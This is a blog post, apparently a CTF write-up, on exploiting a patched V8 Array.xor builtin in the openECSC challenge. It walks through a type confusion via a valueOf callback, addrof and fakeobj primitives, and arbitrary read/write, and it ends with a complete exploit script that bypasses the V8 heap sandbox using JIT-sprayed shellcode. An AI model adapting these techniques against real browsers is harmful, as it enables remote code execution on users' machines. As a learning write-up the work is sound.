@@ -1,0 +1,298 @@
+---
+layout: posts
+title:  "openECSC - BabyArray.xor"
+date:   2024-08-02 02:00:00 +0200
+---
+*Challenge to get familiar with V8 internals*
+
+Even though I do not have much experience with V8 challenges and pwn up until this point, I spent last week learning about v8 exploits and I wanted to try to tackle this challenge from openECSC. For the info I did not manage to solve it by myself at first, because I was struggling to get my wasm code to work properly, so I had to look up how others bypassed the problems I encountered, which I will explain later.
+
+From what I currently know, v8 exploits are usually multistage. The first thing needed to achieve is some kind of memory corruption/type confusion, after that the most common approach is to get addrof and fakeobj primitives, which are somehow equivalent to "arbitrary" read and creating fake objects at arbitrary places. These two are further utilized to get "arbitrary" reads and writes and eventually code execution. (Note "" around arbitrary, on recent V8 versions there is mitigation in place which prevent arbitrary reads, but we will get into that)
+
+## New functionality? 
+The challenge introduces new method which can be applied on Array objects.
+```js
++/*
++  Array.xor()
++
++  let x = [0.1, 0.2, 0.3];
++  x.xor(5);
++*/
++BUILTIN(ArrayXor) {
++  HandleScope scope(isolate);
++  Factory *factory = isolate->factory();
++  Handle<Object> receiver = args.receiver();
++
++  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
++    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
++      factory->NewStringFromAsciiChecked("Nope")));
++  }
++
++  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
++  ElementsKind kind = array->GetElementsKind();
++
++  if (kind != PACKED_DOUBLE_ELEMENTS) {
++    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
++      factory->NewStringFromAsciiChecked("Array.xor needs array of double numbers")));
++  }
++
++  // Array.xor() needs exactly 1 argument
++  if (args.length() != 2) {
++    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
++      factory->NewStringFromAsciiChecked("Array.xor needs exactly one argument")));
++  }
++
++  // Get array len
++  uint32_t length = static_cast<uint32_t>(Object::Number(array->length()));
++
++  // Get xor value
++  Handle<Object> xor_val_obj;
++  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, xor_val_obj, Object::ToNumber(isolate, args.at(1)));
++  uint64_t xor_val = static_cast<uint64_t>(Object::Number(*xor_val_obj));
++
++  // Ah yes, xoring doubles..
++  Handle<FixedDoubleArray> elements(FixedDoubleArray::cast(array->elements()), isolate);
++  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
++    double x = elements->get_scalar(i);
++    uint64_t result = (*(uint64_t*)&x) ^ xor_val;
++    elements->set(i, *(double*)&result);
++  });
++  
++  return ReadOnlyRoots(isolate).undefined_value();
++}
++
+```
+This patch introduces new .xor() prototype, that can be used to xor all values in array of doubles.
+
+Looking at the patch we can see it makes sure that all elements of the array are `PACKED_DOUBLE_ELEMENTS`, as well as the check whether the array is indeed an array and `HASONLYSIMPLERECEIVERELEMENTS`, which according to chromium source code "Checks that we have no accessors on the receiver's elements. ".
+
+Overall the new functionality seems to be vulnerability proof or is it?
+If we take a look it does not check anything regarding the argument which gets passed into the function. All it does is to cast it to ToNumber and this happens after all checks regarding our array.
+
+```
+d8> arr = [1.1, 1.2, 1.3]
+[1.1, 1.2, 1.3]
+d8> bad = {valueOf: () => {arr[0] = {}; return 1;}}
+{valueOf: () => {arr[0] = {}; return 1;}}
+d8> arr.xor(bad)
+undefined
+d8> arr
+[141920, 1.2, 141944]
+```
+
+Woah v8 returned integer value rather than float, what happened?
+Using `./d8 --allow-natives-syntax` we can use debug statements to get more information about what happened.
+
+Let's try to use debug print on original array.
+```
+d8> arr = [1.1, 1.2, 1.3]
+[1.1, 1.2, 1.3]
+d8> %DebugPrint(arr)
+DebugPrint: 0xf3e00042be9: [JSArray]
+ - map: 0x0f3e001cb7c5 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x0f3e001cb11d <JSArray[0]>
+ - elements: 0x0f3e00042bc9 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 3
+ - properties: 0x0f3e00000725 <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0xf3e00000d99: [String] in ReadOnlySpace: #length: 0x0f3e00025f85 <AccessorInfo name= 0x0f3e00000d99 <String[6]: #length>, data= 0x0f3e00000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
+ }
+ - elements: 0x0f3e00042bc9 <FixedDoubleArray[3]> {
+           0: 1.1
+           1: 1.2
+           2: 1.3
+ }
+0xf3e001cb7c5: [Map] in OldSpace
+ - map: 0x0f3e001c01b5 <MetaMap (0x0f3e001c0205 <NativeContext[295]>)>
+ - type: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - unused property fields: 0
+ - elements kind: PACKED_DOUBLE_ELEMENTS
+ - enum length: invalid
+ - back pointer: 0x0f3e001cb785 <Map[16](HOLEY_SMI_ELEMENTS)>
+ - prototype_validity cell: 0x0f3e00000a89 <Cell value= 1>
+ - instance descriptors #1: 0x0f3e001cb751 <DescriptorArray[1]>
+ - transitions #1: 0x0f3e001cb7ed <TransitionArray[4]>
+   Transition array #1:
+     0x0f3e00000e5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x0f3e001cb805 <Map[16](HOLEY_DOUBLE_ELEMENTS)>
+ - prototype: 0x0f3e001cb11d <JSArray[0]>
+ - constructor: 0x0f3e001cae09 <JSFunction Array (sfi = 0xf3e0002b2f9)>
+ - dependent code: 0x0f3e00000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
+ - construction counter: 0
+
+[1.1, 1.2, 1.3]
+```
+I am not going to explain the whole output, important thing to notice is the type of array = `PACKED_DOUBLE_ELEMENTS`. This map object helps v8 to differentiante between different types of arrays in memory.
+
+Let's try to corrupt memory and see what happens.
+```
+d8> bad = {valueOf: () => {arr[0] = {}; return 1;}}
+{valueOf: () => {arr[0] = {}; return 1;}}
+d8> arr.xor(bad)
+undefined
+d8> %DebugPrint(arr)
+DebugPrint: 0xf3e00042be9: [JSArray]
+ - map: 0x0f3e001cb845 <Map[16](PACKED_ELEMENTS)> [FastProperties]
+ - prototype: 0x0f3e001cb11d <JSArray[0]>
+ - elements: 0x0f3e00044e21 <FixedArray[3]> [PACKED_ELEMENTS]
+ - length: 3
+ - properties: 0x0f3e00000725 <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0xf3e00000d99: [String] in ReadOnlySpace: #length: 0x0f3e00025f85 <AccessorInfo name= 0x0f3e00000d99 <String[6]: #length>, data= 0x0f3e00000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
+ }
+ - elements: 0x0f3e00044e21 <FixedArray[3]> {
+           0: 141058
+           1: 0x0f3e00044e41 <HeapNumber 1.2>
+           2: 141082
+ }
+
+ ...
+```
+
+Here we are getting `PACKED_ELEMENTS` instead of `PACKED_DOUBLE_ELEMENTS`. This is an indicator that we managed to corrupt the array to not be array of doubles. Important thing to note here is what is currently at arr[0]. If we take a look at our "bad" code we can see we set it to an object, meaning v8 firstly changed to array type to `PACKED_ELEMENTS` to be able to store different types rather than just double. After that xor functionality ran so it xorred the value with 1.
+
+## Getting addrof and fakeobj
+Given these properties, we can set arr[0] to point to some existing object to write a pointer in arr[0], which we can then read. This will provide us with `addrof` primitives, because we will be able to read ptr to any object.
+
+Other than that I gathered helper functions from other writeups to help with debugging and type casting:
+```js
+const buffer = new ArrayBuffer(8);
+const floatBuffer = new Float64Array(buffer);
+const int64Buffer = new BigUint64Array(buffer);
+function i2f(i) {int64Buffer[0] = i; return floatBuffer[0];};
+function f2i(f) {floatBuffer[0] = f; return int64Buffer[0];};
+function hex32(i) {return "0x" + i.toString(16).padStart(8, 0);};
+function hex64(i) {return "0x" + i.toString(16).padStart(16, 0);};
+```
+
+Let's craft the addrof primitive:
+```js
+function addrof(obj) {
+    var arr = [13.37]; 
+    arr.xor({
+        valueOf: function() {
+            arr[0] = {}; 
+            arr[0] = obj; 
+            return 1;
+        }
+    });
+    return (arr[0] << 1) | 1;
+};
+```
+
+If you don't have any experience with v8 you may be asking why am I shifting value by one bit and adding 1 to the end. This is because of tagged pointers. In PACKED_ELEMENTS array everything ending ending with LSB set gets interpreted as a pointer. To make sure this works properly all other values like SMI (small integers) needs to be shifted by 1 even though they may be ending with 0. When reading value, this will get automatically reversed so to get correct ptr as it is written on the v8 heap we need to do this.
+
+If you are trying to go through my writeup till this point you are definitely wondering why are we still getting only 32 bit addresses and not 64bits? Of course there is nothing at `0x00000000xxxxxxx1`. This is what V8 calls POINTER COMPRESSION. Given that v8 assumes everything is happening inside of v8's heap (except JITted code where it gets really complicated) it does not need to store the first 4 bytes of the address - it is useless to store, because it is the same everytime. Therefore address like 0x00002f2741414141 gets compressed to 0x41414141 while being stored on heap.
+
+Having a valid ptr now we will be able to utilize fakeobj primitive which we can craft aswell.
+```js
+function fakeobj(ptr) {
+    var arr = [13.37]; 
+    arr.xor({
+        valueOf: function() {
+            arr[0] = {}; 
+            arr[0] = (ptr >> 0x1); 
+            return 1;
+        }
+    });
+    return arr[0];
+}
+```
+
+## Arbitrary r/w? Not so fast!
+Exploiting using addrof and fakeobj used to be pretty straightforward. From these two you could achieve arbitrary reads/writes pretty easily. After getting arb r/w primitives v8 exploitation went as follows:
+1. try to allocate rwx page
+2. write shellcode to rwx page
+3. jump to shellcode
+
+However over the course of multiple years exploitation got harder with more mitigations in place. For example, at first you could allocate rwx just by JIT compiling a function. This was later mitigated by alternating permissions on allocated page between rw- and r-x. 
+Smarter people later discovered that you can compile wasm compiled code page to create rwx pages. 
+After that came another mitigation - V8 Heap Sandbox, which basically made sure that all external pointers are converted to indexes of a lookup table. [Here](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8) is the detail of the sandbox.
+
+To break this mitigation we can use JIT internal logic that writes floats to rwx page during compilation. Therefore we can write shellcode to rwx pages using simple function with double and then jump to it. There is an slight problem, because compiled doubles are not contigous, however this can still be bypassed by using relative jmps at the end of each block = "double".
+
+Here is pretty good writeup explaining the topic: [Breaking v8 heap sandbox](https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html)
+
+Note: After looking at writeups from others, they were using old technique without heap sandbox just by creating wasm page and writing to it. However I wasn't able to replicate their exploit using their code. What could have happened is that the docker image changed or ran on different CPU that had some mitigation enable. 
+
+## Voilà
+After few hours of trying to bypass the sandbox I got a flag and I was so happy and tired.
+Here is my full code:
+```js
+const buffer = new ArrayBuffer(8);
+const floatBuffer = new Float64Array(buffer);
+const int64Buffer = new BigUint64Array(buffer);
+
+function i2f(i) {
+    int64Buffer[0] = i;
+    return floatBuffer[0];
+};
+
+function f2i(f) {
+    floatBuffer[0] = f;
+    return int64Buffer[0];
+};
+
+function hex32(i) {
+    return "0x" + i.toString(16).padStart(8, 0);
+};
+
+function hex64(i) {
+    return "0x" + i.toString(16).padStart(16, 0);
+};
+
+function obj2ptr(obj) {
+    var arr = [13.37];
+    arr.xor({
+        valueOf: function() {
+            arr[0] = {};
+            arr[0] = obj;
+            return 1
+        }
+    });
+    return (arr[0] << 1) | 1;
+};
+
+function ptr2obj(ptr) {
+    var arr = [13.37];
+    arr.xor({
+        valueOf: function() {
+            arr[0] = {};
+            arr[0] = (ptr >> 0x1);
+            return 1;
+        }
+    });
+    return arr[0];
+}
+
+function read(addr) {
+    const readArr = [1.1, 2.2];
+    readArr[0] = i2f(0x00000725001cb7c5n);
+    readArr[1] = i2f(0x0000000200000000n + BigInt(addr) - 0x8n);
+    return f2i(ptr2obj(obj2ptr(readArr) - 0x10)[0]);
+}
+
+function write(addr, data) {
+    const writeArr = [1.1, 2.2];
+    writeArr[0] = i2f(0x00000725001cb7c5n);
+    writeArr[1] = i2f(0x0000000200000000n + BigInt(addr) - 0x8n);
+    const fakeArr = ptr2obj(obj2ptr(writeArr) - 0x10);
+    fakeArr[0] = i2f(data);
+}
+
+function shellcode() {
+    return [1.9711828979523134e-246, 1.9562205631094693e-246, 1.9557819155246427e-246, 1.9711824228871598e-246, 1.971182639857203e-246, 1.9711829003383248e-246, 1.9895153920223886e-246, 1.971182898881177e-246]
+};
+for (let i = 0; i < 10000; i++) shellcode();
+
+const funcAddr = obj2ptr(shellcode);
+const codeAddr = read(funcAddr + 0x8) >> 32n;
+const instructionStart = codeAddr + 0x14n;
+write(instructionStart, read(instructionStart) + 0x7fn);
+shellcode();
+```
+
+Note2: Original writeup from the author used the same technique of storing doubles on rwx page, but he used wasm code to do so.
+
+Overall this wasn't extremely hard challenge, but it was really fun to tackle with. 
